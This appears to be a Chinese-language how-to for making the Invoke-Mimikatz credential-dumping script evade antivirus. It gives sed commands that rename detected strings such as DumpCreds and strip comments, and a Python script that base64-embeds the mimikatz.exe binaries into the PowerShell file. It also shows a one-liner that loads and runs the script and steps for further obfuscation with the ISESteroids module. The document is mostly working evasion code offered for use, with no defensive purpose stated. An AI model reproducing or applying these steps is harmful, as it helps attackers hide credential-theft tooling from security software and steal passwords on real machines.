# 免杀 —> Invoke-Mimikatz

- 下载[Invoke-Mimikatz.ps1](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1)
    - 先字符混淆
    
    ```python
    sed -i -e 's/Invoke-Mimikatz/Invoke-Mimigray/g' Invoke-Mimikatz.ps1
    sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
    sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
    sed -i -e 's/DumpCreds/DumpTrust/g' Invoke-Mimikatz.ps1
    sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
    sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
    sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
    ```
    
- 将python脚本、Invoke-Mimikatz.ps1和mimikatz_trunk放在同一目录
    - 将win32和x64的exe写入到Invoke-Mimikatz.ps1
    
    ```python
    import fileinput
    import base64
    
    with open("./mimikatz_trunk/Win32/mimikatz.exe", "rb") as f:
        win32 = base64.b64encode(f.read()).decode()
    
    with open("./mimikatz_trunk/x64/mimikatz.exe", "rb") as f:
        x64 = base64.b64encode(f.read()).decode()
    
    for line in fileinput.FileInput("./Invoke-Mimikatz.ps1", inplace=1):
        line = line.rstrip('\r\n')
        if "$PEBytes64 = " in line:
            print("$PEBytes64 = '" + x64 + "'")
        elif "$PEBytes32 = " in line:
            print("$PEBytes32 = '" + win32 + "'")
        else:
            print(line)
    ```
    
    - `powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimigray`
    - 可以修改任意函数名，比如`Invoke-Mimigray`改成`test-function`
- PowerShell ISE混淆
    - 安装ISE模块（安装前先挂个全局代理）
        - `Install-Module -Name "ISESteroids" -Scope CurrentUser -Repository PSGallery -Force`
    - 输入`Start-Steroids`
    - 打开刚刚需要混淆的文件，工具 -> Obfuscate Code
